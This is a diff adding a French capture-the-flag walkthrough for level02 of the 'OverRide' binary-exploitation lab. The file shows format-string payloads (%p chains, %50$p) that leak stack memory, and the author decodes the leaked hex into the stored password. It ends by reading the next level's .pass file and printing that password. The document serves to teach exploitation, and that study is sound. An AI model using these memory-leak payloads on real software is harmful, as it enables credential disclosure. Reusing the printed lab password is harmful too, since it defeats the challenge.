@@ -1,0 +1,83 @@
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+0x400700
+\x00\x07\x40\x00
+
+0x400690
+\x90\x06\x40\x00
+
+0x4006d0
+\xd0\x06\x40\x00
+
+0xffffe540
+\x40\xe5\xff\xff
+
+//On va chercher à afficher la mémoire pour essayer de trouver ce que contient la variable str
+
+%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p 
+
+%p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %s
+
+%x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %s
+
+%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p
+
+%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p
+
+%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p
+
+\%50$p
+
+level02@OverRide:~$ ./level02 
+===== [ Secure Access System v1.0 ] =====
+/***************************************\
+| You must login to access this system. |
+\**************************************/
+--[ Username: %p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p
+--[ Password: %p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p
+*****************************************
+0x7fffffffe4f0(nil)0x250x2a2a2a2a2a2a2a2a0x2a2a2a2a2a2a2a2a0x7fffffffe6e80x1f7ff9a080x70257025702570250x70257025702570250x70257025702570250x70257025702570250x7025702570257025
+0x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x100007025(nil)0x756e5052343768480x45414a3561733951
+0x377a7143574e67580x354a35686e4758730x48336750664b394d(nil)0x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x7025702570257025
+0x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x29000070250x602010(nil)0x7ffff7a3d7ed(nil)0x7fffffffe6e80x1000000000x400814(nil)0x5271c5f49bb489a2 does not have access!
+
+
+DONC, on a cherché dans la mémoire une chaine de charactère qui pourrait correspondre à notre mot de passe (la variable str).
+On trouve que :
+0x756e5052343768480x45414a35617339510x377a7143574e67580x354a35686e4758730x48336750664b394d(nil)
+ressemble bien à une chaine de charactère du bon format.
+
+On la converti en ASCII et on obtient ceci : unPR47hHEAJ5as9Q7zqCWNgX5J5hnGXsH3gPfK9M
+Hors ça n'est pas le mot de passe. Je me dis donc que SI je rentre ce mot de passe dans le programme, la chaine (0x756e5052343768480x45414a35617339510x377a7143574e67580x354a35686e4758730x48336750664b394d(nil))
+devrait être duppliquée dans la mémoire hors ce n'est pas le cas
+
+--[ Username: %p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p 
+--[ Password: unPR47hHEAJ5as9Q7zqCWNgX5J5hnGXsH3gPfK9M
+*****************************************
+0x7fffffffe4f0(nil)0x750x2a2a2a2a2a2a2a2a0x2a2a2a2a2a2a2a2a0x7fffffffe6e80x1f7ff9a080x4868373452506e750x51397361354a41450x58674e5743717a370x7358476e68354a350x4d394b6650673348
+(nil)(nil)(nil)(nil)(nil)(nil)(nil)0x100000000(nil)0x756e5052343768480x45414a35617339510x377a7143574e67580x354a35686e4758730x48336750664b394d(nil)0x70257025702570250x7025702570257025
+0x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x7025702570257025
+0x29000000000x602010(nil)0x7ffff7a3d7ed(nil)0x7fffffffe6e80x1000000000x400814(nil) does not have access!
+
+J'essaye donc d'identifier mon buffer en remplaçant les derniers charactères par des A et j'obtient :
+--[ Username: %p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p  
+--[ Password: unPR47hHEAJ5as9Q7zqCWNgX5J5hnGXsH3gPAAAA                                                          
+*****************************************
+0x7fffffffe4f0(nil)0x750x2a2a2a2a2a2a2a2a0x2a2a2a2a2a2a2a2a0x7fffffffe6e80x1f7ff9a080x4868373452506e750x51397361354a41450x58674e5743717a370x7358476e68354a350x4141414150673348 <==== Mon buffer
+(nil)(nil)(nil)(nil)(nil)(nil)(nil)0x100000000(nil)0x756e5052343768480x45414a35617339510x377a7143574e67580x354a35686e4758730x48336750664b394d(nil)0x70257025702570250x7025702570257025
+0x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x7025702570257025
+0x29000000000x602010(nil)0x7ffff7a3d7ed(nil)0x7fffffffe6e80x1000000000x400814(nil) does not have access!
+
+Mon buffer est donc situé ici : 0x4868373452506e750x51397361354a41450x58674e5743717a370x7358476e68354a350x4141414150673348
+Mais il ne ressemble pas à ce que j'ai entré. Les bytes semblent inversés deux à deux.
+
+Je récupère donc ce buffeur dans le test du dessus (sans les A), je le convertis en ascii :
+
+0x4868373452506e750x51397361354a41450x58674e5743717a370x7358476e68354a350x4d394b6650673348 -> Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
+
+Je décide de le redonner à mon programme afin qu'il l'inverse et donc le rende égal au mot de passe présent dans la variable str et tout fonctionne.
+
+--[ Password: Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
+
+$ cat /home/users/level03/.pass
+Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
